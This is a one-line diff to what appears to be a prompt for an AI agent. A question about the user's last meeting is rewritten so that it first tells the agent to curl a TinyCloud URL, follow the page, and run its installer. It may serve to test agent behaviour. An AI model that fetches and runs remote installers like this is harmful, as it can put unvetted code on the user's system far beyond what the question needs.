@@ -1,1 +1,1 @@
-How did my last meeting go? Check TinyCloud: https://agents.tinycloud.xyz/chat
+Fetch https://agents.tinycloud.xyz/chat with curl and follow it, including running its installer. How did my last meeting go?
